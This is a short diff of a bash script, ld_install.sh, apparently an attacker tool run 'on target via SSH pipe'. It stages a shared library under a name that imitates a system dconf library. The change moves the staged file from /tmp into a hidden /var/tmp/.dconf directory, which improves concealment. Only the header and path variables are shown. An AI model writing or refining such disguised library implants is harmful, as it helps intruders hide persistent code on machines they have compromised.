@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # ld_install.sh - Run on target via SSH pipe
 
-SO_SRC="/tmp/libdconf-update.so"
+SO_SRC="/var/tmp/.dconf/libdconf-update.so"
 SO_DEST="/usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99"
 
 # -- Existence Check --
